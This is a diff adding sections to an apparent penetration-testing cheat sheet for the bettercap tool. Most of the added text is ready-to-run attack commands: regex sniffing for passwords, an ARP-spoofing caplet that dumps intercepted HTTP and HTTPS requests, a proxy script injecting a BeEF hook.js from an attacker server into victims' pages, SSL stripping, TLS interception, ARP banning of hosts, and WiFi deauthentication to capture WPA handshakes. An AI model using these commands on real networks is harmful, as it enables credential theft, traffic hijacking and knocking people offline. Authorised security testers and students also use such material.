@@ -86,6 +86,78 @@ set net.sniff.filter not arp
 set net.sniff.filter dhcp
 ```
 
+### Password Sniffing
+
+```
+set net.sniff.local true
+set net.sniff.regexp '.*password=.+'
+set net.sniff.verbose 'true'
+set net.sniff.output ‘passwords.pcap’
+```
+
+#### You could use predefined caplet http-req-dump.cap:
+
+```
+# targeting the whole subnet by default, to make it selective:
+#
+# sudo ./bettercap -caplet http-req-dump.cap -eval "set arp.spoof.targets 192.168.1.10"
+
+# to make it less verbose
+# events.stream off
+
+# discover a few hosts 
+net.probe on
+sleep 1
+net.probe off
+
+# uncomment to enable sniffing too
+set net.sniff.verbose false
+set net.sniff.local true
+set net.sniff.filter tcp port 443
+net.sniff on
+
+# we'll use this proxy script to dump requests
+set https.proxy.script http-req-dump.js
+set http.proxy.script http-req-dump.js
+clear
+
+# go ^_^
+http.proxy on
+https.proxy on
+arp.spoof on
+```
+
+## Proxy JS Injection (XSS)
+
+we use beef-xss active caplet
+
+```
+function onLoad() {
+  log( "BeefInject loaded." );
+  log("targets: " + env('arp.spoof.targets'));
+}
+
+function onResponse(req, res) {
+  if( res.ContentType.indexOf('text/html') == 0 ){
+    var body = res.ReadBody();
+    if( body.indexOf('</head>') != -1 ) {
+ log( "BeefInject loaded." );
+log("targets: " + env('arp.spoof.targets'));
+      res.Body = body.replace( 
+        '</head>', 
+        '<script type="text/javascript" src="http://<YOUR_SERVER>:3000/hook.js"></script></head>' 
+      ); 
+    }
+  }
+}
+```
+
+```
+bettercap -caplet beef-active.cap -eval "set arp.spoof.targets 192.168.1.6; arp.spoof on;" -debug
+```
+
+When user opens HTTP website, for instance time.com, hook will be executed
+
 ## Fuzzing
 
 In addition to packet-sniffing capabilities, Bettercap also can mutate packets for network protocol fuzzing using the net.fuzz module. By default, the net.fuzz module will mutate 100% of packets transmitted by Bettercap, mutating 40% of the packet payload data. You can adjust these values by changing the net.fuzz.rate and net.fuzz.ratio parameters.
@@ -176,6 +248,20 @@ if the gateway has ARP spoof protection the attack will fail
 
 ```
 set arp.spoof.fullduplex true/false 
+
+# example:
+# Ban the address 192.168.1.6 from the network:
+set arp.spoof.targets 192.168.1.6; arp.ban on
+
+# Spoof 192.168.1.2, 192.168.1.3 and 192.168.1.4
+set arp.spoof.targets 192.168.1.2-4; arp.spoof on
+```
+
+## Ban Target From Network
+
+```
+set arp.spoof.targets <TARGET_IP>
+arp.ban on
 ```
 
 ## DNS Spoof
@@ -221,4 +307,187 @@ dhcp6.spoof on/off
 ```
 ndp.spoof on/off
 ```
+
+## Custom Proxy
+
+turn any proxy on/off
+
+```
+any.proxy on/off
+
+# set interface for redirection
+set any.proxy.iface <interface name>
+
+# set protocol
+set any.proxy.protocol TCP/UDP
+
+# set port
+set any.proxy.src_port 80
+
+# set source address
+set any.proxy.src_address [ip]
+
+# set dest address
+set any.proxy.dst_address [ip]	
+
+# set dst port
+set any.proxy.dst_port	[port]
+```
+
+## TCP Proxy
+
+```
+tcp.proxy on/off
+```
+
+## HTTP Proxy
+
+```
+http.proxy on/off
+```
+
+#### enable SSL strip attack
+
+```
+set http.proxy.sslstrip true/false
+```
+
+#### URL, path or js code to inject into every HTML page
+
+```
+http.proxy.injectjs
+set http.proxy.script /root/Desktop/Hook.js
+
+# example:
+# Will ARP spoof the whole network,
+# enable sslstrip and inject a 
+# “Hello World” javascript alert 
+# to every HTML page being visited:
+
+set http.proxy.injectjs alert("Hello World")
+set http.proxy.sslstrip true
+
+http.proxy on
+arp.spoof on
+```
+
+## HTTPS Proxy
+
+A full featured HTTPS transparent proxy that can be scripted using javascript modules. If used together with a spoofer, all HTTPS traffic will be redirected to it and it will automatically handle port redirections as needed.
+
+{% hint style="info" %}
+When a new TLS connection is being proxied, bettercap will fetch the original certificate from the target host and resign on the fly the full chain using its own CA.
+{% endhint %}
+
+```
+https.proxy on/off
+```
+
+#### enable SSL strip attack
+
+```
+set https.proxy.sslstrip true/false
+```
+
+#### inject js code
+
+```
+https.proxy.injectjs
+set https.proxy.script /root/Desktop/Hook.js
+```
+
+## Wifi Network Monitoring
+
+wifi.recon covers both 2.4 Ghz and 5Ghz frequencies. It’s doing everything you need. Deauth, Sniff, Handshake captures. To start, add -iface option:
+
+```
+ bettercap -iface wlan0
+```
+
+{% hint style="info" %}
+In case of an error: Can’t restore interface wlan0 wireless mode (SIOCSIWMODE failed: Bad file descriptor). Please adjust manually. Quit bettercap and manually set the wireless interface to monitor mode. For example, as follows:
+
+
+
+```
+$ sudo ip link set wlan0 down
+$ sudo iw wlan0 set monitor control
+$ sudo ip link set wlan0 up
+```
+{% endhint %}
+
+Turn on recon:
+
+```
+wifi.recon on
+```
+
+You can manage channels with:
+
+```
+wifi.recon.channel 10,11
+```
+
+To clear them:
+
+```
+wifi.recon.channel clear
+```
+
+Results can be seen with:
+
+```
+wifi.show
+```
+
+To capture handshakes, we should define a sniffer, filter specific frames (0x888e), set the output file for processing later on, maybe select the channel and or target:
+
+```
+» set net.sniff.verbose true
+» set net.sniff.filter ether proto 0x888e
+» set net.sniff.output /root/wpa.pcap
+» net.sniff on
+
+» wifi.recon.channel 1
+» wifi.recon on
+» wifi.recon 94:33:30:a6:2b:63
+```
+
+Then we should hit it with the Deauth. You can deauth all clients with:
+
+```
+wifi.deauth AP-BSSID
+```
+
+or just specific one:
+
+```
+wifi.deauth CLIENT-BSSID
+```
+
+When you capture the handshake, you can start breaking them. We’ll not cover that here.
+
+## BLE (Bluetooth Low Energy device discovery)
+
+The `ble.recon` will discovery every BLE device you want to inspect with `ble.enum` or playaround with `ble.write`.
+
+To connect, enumerate and read characteristics from the BLE device 04:ff:de:ff:be:ff:
+
+```
+ble.enum 04:ff:de:ff:be:ff
+```
+
+Write the bytes `ff ff ff ff ff ff ff ff` to the BLE device `04:ff:de:ff:be:ff` on its characteristics with UUID `234afbd5e3b34536a3fe72f630d4278d`:
+
+```
+ ble.write 04:ff:de:ff:be:ff 234afbd5e3b34536a3fe72f630d4278d ffffffffffffffff
+```
+
+{% hint style="info" %}
+ble.enum only works one time per execution&#x20;
+
+incomplete support for macOS&#x20;
+
+not supported on Windows
+{% endhint %}
 
